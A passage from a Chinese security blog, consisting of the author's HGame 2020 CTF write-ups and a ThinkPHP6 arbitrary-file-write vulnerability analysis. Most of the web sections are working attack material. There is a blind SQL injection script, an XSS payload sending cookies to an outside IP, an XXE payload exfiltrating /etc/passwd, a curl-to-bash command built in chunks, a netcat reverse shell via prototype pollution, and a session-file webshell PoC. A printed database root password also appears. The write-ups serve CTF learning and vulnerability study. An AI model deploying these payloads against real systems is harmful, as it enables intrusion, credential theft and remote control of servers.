+    print(&quot;%s fail&quot; % sql)
+    return False
+
+# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)
+cha=&quot;0123456789ABCDEF&quot;
+result=&quot;&quot;
+p=0
+while True:
+    p+=1
+    temp=&#39;&#39;
+    for i in cha:
+        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):
+            result+=i
+            temp=i
+            print(result)
+            break
+    if temp!=result[-1]:
+        break
+
+#information_schema,babysql
+#messages,user
+#id,name,password
+</code></pre>
+<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
+<p>存在csp:</p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p>
+<p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
+<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p>
+<p>说object-src不安全</p>
+<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
+<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
+<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
+<p>我们发送以下payload(用script标签也一样)</p>
+<pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
+<p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p>
+<p>最后的payload</p>
+<pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;
+var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3b
+iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
+eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p>
+<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
+%sp;
+%param1;
+]&gt;
+&lt;r&gt;&amp;exfil;&lt;/r&gt;
+
+File stored on http://39.108.164.219/evil.xml
+&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p>
+<pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+$result = null;
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+
+try{
+    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);
+    $stmt-&gt;bindParam(&#39;:id&#39;, $id);
+    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);
+    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);
+    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);
+
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds = simplexml_import_dom($dom);
+    $id = $creds-&gt;id;
+    $chal_name = $creds-&gt;name;
+    $level = $creds-&gt;level;
+    $time = $creds-&gt;time;
+    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {
+        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);
+        die($result);
+    }
+    $stmt-&gt;execute();
+    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);
+}catch(Exception $e){
+    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);
+}
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&gt;</code></pre>
+<p>config.php</p>
+<pre><code class="php">&lt;?php
+$dbms=&#39;mysql&#39;;
+$host=&#39;localhost&#39;;
+$dbName=&#39;bdctr_message&#39;;
+$user=&#39;root&#39;;
+$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;
+
+$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
+$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
+$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+?&gt;</code></pre>
+<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
+<p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p>
+<pre><code>IP address       HW type     Flags       HW address            Mask     Device
+172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
+172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
+172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
+172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0
+</code></pre><pre><code>127.0.0.1    localhost
+::1    localhost ip6-localhost ip6-loopback
+fe00::0    ip6-localnet
+ff00::0    ip6-mcastprefix
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+172.21.0.76    hgame-private
+172.21.0.31    f9f1b9b99e13</code></pre><p>发现一个内网服务器<code>172.21.0.76</code></p>
+<p>当尝试访问80端口时,发现文件太大等一系列问题</p>
+<blockquote>
+<p>使用libxml读取文件时,文件不能太大否则会报错</p>
+</blockquote>
+<p>于是尝试压缩能不能读取</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));
+    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);
+    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);
+?&gt;
+</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?php
+error_reporting(0);
+
+$token = @$_GET[&#39;token&#39;];
+if (!isset($token)) {
+    die(&quot;请带上您的队伍token访问! /?token=&quot;);
+}
+$api = &quot;http://checker/?token=&quot;.$token;
+$t = file_get_contents($api);
+if($t !== &quot;ok&quot;) {
+    die(&quot;队伍token错误&quot;);
+}
+
+highlight_file(__FILE__);
+
+$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;
+@mkdir($sandbox);
+@chdir($sandbox);
+
+$content = $_GET[&#39;v&#39;];
+if (isset($content)) {
+    $cmd = substr($content,0,5);
+    system($cmd);
+}else if (isset($_GET[&#39;r&#39;])) {
+    system(&#39;rm -rf ./*&#39;);
+}
+
+/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
+  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
+ | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
+  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
+  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
+ |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
+                                    |/
+
+*/</code></pre>
+<p>然后利用 <a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
+<p>的方法来执行命令</p>
+<pre><code class="php">
+&lt;?php
+    $a=file_get_contents(&quot;tmp.xml&quot;);
+    $command=array(
+    &#39;&gt;ls\\\\&#39;, 
+    &#39;ls&gt;_&#39;, 
+    &#39;&gt;\\ \\\\&#39;, 
+    &#39;&gt;-t\\\\&#39;, 
+    &#39;&gt;\\&gt;g&#39;, 
+    &#39;ls&gt;&gt;_&#39;,
+
+    &quot;&gt;bash&quot;,
+    &quot;&gt;\\|\\\\&quot;,
+    &quot;&gt;5\\\\&quot;,
+    &quot;&gt;00\\\\&quot;,
+    &quot;&gt;60\\\\&quot;,
+    &quot;&gt;9:\\\\&quot;,
+    &quot;&gt;21\\\\&quot;,
+    &quot;&gt;4.\\\\&quot;,
+    &quot;&gt;16\\\\&quot;,
+    &quot;&gt;8.\\\\&quot;,
+    &quot;&gt;10\\\\&quot;,
+    &quot;&gt;9.\\\\&quot;,
+    &quot;&gt;3\\\\&quot;,
+    &quot;&gt;\\ \\\\&quot;,
+    &quot;&gt;rl\\\\&quot;,
+    &quot;&gt;cu\\\\&quot;
+    );
+    foreach($command as $v)
+    {
+        echo $v.&quot;\n&quot;;
+        $v=urlencode($v);
+        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));
+        $postdata=&lt;&lt;&lt;MRK
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE msg [
+&lt;!ELEMENT msg ANY &gt;
+&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
+%sp;
+%param1;
+]&gt;
+&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;
+MRK;
+        $opts = array(&#39;http&#39; =&gt; 
+        array( &#39;method&#39;  =&gt; &#39;POST&#39;,
+        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,
+        &#39;content&#39; =&gt; $postdata ) 
+    );
+        $context = stream_context_create($opts);
+        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);
+
+    }
+
+
+?&gt;
+</code></pre>
+<p>在经历一次rm -rf 之后,终于拿到getshell</p>
+<p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p>
+<p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p>
+<h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p>
+<p>拿到题目,是我不熟悉的nodejs</p>
+<p>影响不大,看个大概就会了</p>
+<p><code>\route\index.js</code></p>
+<pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {
+  if (!req.session.sekiro) {
+    res.end(&quot;Session required.&quot;)
+  }
+  if (!req.session.sekiro.alive) {
+    res.end(&quot;You dead.&quot;)
+  }
+  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
+  var copybody = clone(body)
+  if (copybody.solution) {
+    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
+  }
+  res.end(&quot;提交成功&quot;+JSON.stringify(req.body))
+})</code></pre>
+<p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p>
+<p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p>
+<p>我们继续阅读代码</p>
+<p>跟进dealWithAttacks</p>
+<pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {
+        if (sekiro.attackInfo.solution !== solution) {
+            sekiro.health -= sekiro.attackInfo.attack
+            if (sekiro.attackInfo.additionalEffect) {
+                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
+                sekiro = fn(sekiro)//look this
+            }
+        }
+        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500
+        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0
+        if (sekiro.posture == 500 || sekiro.health == 0) {
+            sekiro.alive = false
+        }
+        return sekiro
+    }</code></pre>
+<pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
+                sekiro = fn(sekiro)</code></pre>
+<p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p>
+<p>我们看一下<code>sekiro.attackInfo.additionalEffect</code>是如何获得的</p>
+<pre><code class="javascript">this.attacks = [
+        {
+            &quot;method&quot;: &quot;连续砍击&quot;,
+            &quot;attack&quot;: 1000,
+            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,
+            &quot;solution&quot;: &quot;连续格挡&quot;
+        },
+        {
+            &quot;method&quot;: &quot;普通攻击&quot;,
+            &quot;attack&quot;: 500,
+            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,
+            &quot;solution&quot;: &quot;格挡&quot;
+        },
+        {
+            &quot;method&quot;: &quot;下段攻击&quot;,
+            &quot;attack&quot;: 1000,
+            &quot;solution&quot;: &quot;跳跃踩头&quot;
+        },
+        {
+            &quot;method&quot;: &quot;突刺攻击&quot;,
+            &quot;attack&quot;: 1000,
+            &quot;solution&quot;: &quot;识破&quot;
+        },
+        {
+            &quot;method&quot;: &quot;巴之雷&quot;,
+            &quot;attack&quot;: 1000,
+            &quot;solution&quot;: &quot;雷反&quot;
+        },
+    ]
+    this.getAttackInfo = function () {
+        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
+    }</code></pre>
+<p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p>
+<p>根据js根据原型链来查找属性的特性</p>
+<p>我们可以用原型链污染来修改Object的additionalEffect属性</p>
+<p>payload:</p>
+<pre><code>POST /action HTTP/1.1
+Host: sekiro.hgame.babelfish.ink
+Content-Length: 169
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Referer: http://sekiro.hgame.babelfish.ink/
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
+Connection: close
+
+{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-type要设置成<code>Content-Type: application/json</code></p>
+<p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p>
+<p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p>
+<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
+<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
+<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
+<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
+<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
+<p>然后拿到里面的word文档,但是是加密的,猝.</p>
+<p>在看一下那个文本,有点像培根密码</p>
+<pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]
+result=&quot;&quot;
+for i in range(0,len(s),5):
+    temp=&quot;&quot;
+    for j in range(5):
+        if s[i+j]==s[i+j].lower():
+            temp+=&quot;0&quot;
+        else :
+            temp+=&quot;1&quot;
+    result+=chr(int(temp,2)+ord(&#39;A&#39;))
+print(result)</code></pre>
+<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
+<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
+<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
+<p>拿到一堆ook直接上谷歌.ok了</p>
+<p>base32-&gt;base64-&gt;二维码</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
+<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import gmpy2
+from secret import A, B, flag
+assert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)
+
+TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
+MOD = len(TABLE)
+
+cipher = &#39;&#39;
+for b in flag:
+    i = TABLE.find(b)
+    if i == -1:
+        cipher += b
+    else:
+        ii = (A*i + B) % MOD
+        cipher += TABLE[ii]
+
+print(cipher)
+# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre>
+<p>我们观察可以发现这其实是个单表替换加密</p>
+<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
+<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
+<p>于是有</p>
+<pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
+MOD = len(TABLE)
+cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;
+
+for A in range(1,MOD):
+    for B in range(1,MOD):
+        result=&quot;&quot;
+        try :
+            #生成加密表
+            TABLE2={}
+            for b in TABLE:
+                i=TABLE.find(b)
+                TABLE2[TABLE[(A*i + B) % MOD]]=b
+            #解密
+            for b in cipher:
+                ii=TABLE.find(b)
+
+                if ii==-1:
+                    result+=b
+                else :
+                    result+=TABLE2[b]
+        except :
+            pass
+        if &quot;hgame&quot; in result:
+            print(result)
+</code></pre>
+<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/07/2020hgame/">http://blog.ccreater.top/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/07/2020hgame/" data-id="ck917a7ba000wu8v0b029edz2" data-title="2020hgame" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>ThinkPHP6.0.0-6.0.1</li>
+<li>开启Sessoin中间件</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
+<p>复现环境为:phpstudy+thinkphp6.0.1</p>
+<p><code>\app\controller\index.php</code>:</p>
+<pre><code class="php">&lt;?php
+namespace app\controller;
+
+use app\BaseController;
+use think\facade\Session;
+class Index extends BaseController
+{
+    public function index($name)
+    {
+        Session::set(&#39;name&#39;, $name);
+        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
+    }
+
+}</code></pre>
+<p><code>\app\middleware.php</code></p>
+<pre><code class="php">&lt;?php
+// 全局中间件定义文件
+return [
+    // 全局请求缓存
+    // \think\middleware\CheckRequestCache::class,
+    // 多语言加载
+    // \think\middleware\LoadLangPack::class,
+//     Session初始化
+     \think\middleware\SessionInit::class
+];</code></pre>
+<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
+<pre><code class="php">public function save(): void
+    {
+        $this-&gt;clearFlashData();//清除原来的数据
+
+        $sessionId = $this-&gt;getId();
+
+        if (!empty($this-&gt;data)) {
+            $data = $this-&gt;serialize($this-&gt;data);
+
+            $this-&gt;handler-&gt;write($sessionId, $data);
+        } else {
+            $this-&gt;handler-&gt;delete($sessionId);
+        }
+
+        $this-&gt;init = false;
+    }</code></pre>
+<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
+<pre><code class="php">public function write(string $sessID, string $sessData): bool
+    {
+        $filename = $this-&gt;getFileName($sessID, true);
+        $data     = $sessData;
+
+        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+
+        return $this-&gt;writeFile($filename, $data);
+    }</code></pre>
+<p>再跟进<code>$this-&gt;writeFile</code></p>
+<pre><code class="php">protected function writeFile($path, $content): bool
+    {
+        return (bool) file_put_contents($path, $content, LOCK_EX);
+    }</code></pre>
+<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
+<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
+<p>跟进去</p>
+<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
+    {
+        if ($this-&gt;config[&#39;prefix&#39;]) {
+            // 使用子目录
+            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
+        } else {
+            $name = &#39;sess_&#39; . $name;
+        }
+
+        $filename = $this-&gt;config[&#39;path&#39;] . $name;
+        $dir      = dirname($filename);
+
+        if ($auto &amp;&amp; !is_dir($dir)) {
+            try {
+                mkdir($dir, 0755, true);
+            } catch (\Exception $e) {
+                // 创建失败
+            }
+        }
+
+        return $filename;
+    }</code></pre>
+<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
+<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
+<pre><code class="php">    public function getId(): string
+    {
+        return $this-&gt;id;
+    }</code></pre>
+<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
+<pre><code class="php">    public function setId($id = null): void
+    {
+        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
+    }</code></pre>
+<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
+<p>查找调用setId的函数</p>
+<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
+<p>其中<code>SessionInit</code></p>
+<pre><code class="php">    public function handle($request, Closure $next)
+    {
+        // Session初始化
+        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
+        $cookieName   = $this-&gt;session-&gt;getName();
+
+        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
+            $sessionId = $request-&gt;request($varSessionId);
+        } else {
+            $sessionId = $request-&gt;cookie($cookieName);
+        }
+
+        if ($sessionId) {
+            $this-&gt;session-&gt;setId($sessionId);
+        }
+    }</code></pre>
+<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
+<p>因此构造payload</p>
+<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E
+
+Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php
+
+访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
+{
+    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
+}</code></pre>
+<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
